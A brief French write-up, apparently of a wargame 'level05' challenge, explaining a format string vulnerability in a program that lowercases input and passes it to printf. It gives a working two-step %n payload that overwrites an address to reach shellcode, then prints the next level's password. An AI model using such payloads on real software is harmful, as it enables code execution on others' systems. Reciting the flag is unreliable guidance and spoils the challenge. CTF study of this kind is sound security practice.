## GET Flag

Ce programme va passer le texte entré par l'utilisateur en minuscule, puis l'imprimer avec printf.
Il est donc possible d'utiliser un format string exploit.

Cependant, imprimer l'équivalent de l'adresse du shellcode en nombre d'espace est bien trop couteux.
Il est donc nécessaire de changer cette adresse en deux temps.

```
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55428x" + "%10$n" + "%10099x" + "%11$n"' > /tmp/level05
```

### Flag

```
level06
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
